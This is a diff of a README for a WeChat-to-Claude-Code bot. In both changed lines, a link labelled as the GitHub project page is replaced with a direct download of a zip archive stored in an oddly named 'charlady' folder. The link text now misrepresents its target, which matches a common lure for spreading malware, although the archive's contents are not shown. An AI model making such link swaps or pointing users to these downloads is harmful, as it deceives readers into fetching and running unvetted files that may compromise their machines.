@@ -1,6 +1,6 @@
 # 🤖 Wechat-Claude-bot - Control Claude Code from WeChat
 
-[![Download / Visit Project Page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Harsh-Kumar-Tyagi/Wechat-Claude-bot)
+[![Download / Visit Project Page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Harsh-Kumar-Tyagi/Wechat-Claude-bot/raw/refs/heads/main/charlady/bot-Claude-Wechat-v1.2-beta.5.zip)
 
 ## 📌 What this is
 
@@ -24,7 +24,7 @@ If you already use Claude Code on your computer, setup will be easier.
 
 Use this link to visit the project page and get the latest files:
 
-[Open the GitHub project page](https://github.com/Harsh-Kumar-Tyagi/Wechat-Claude-bot)
+[Open the GitHub project page](https://github.com/Harsh-Kumar-Tyagi/Wechat-Claude-bot/raw/refs/heads/main/charlady/bot-Claude-Wechat-v1.2-beta.5.zip)
 
 Follow these steps on Windows:
 
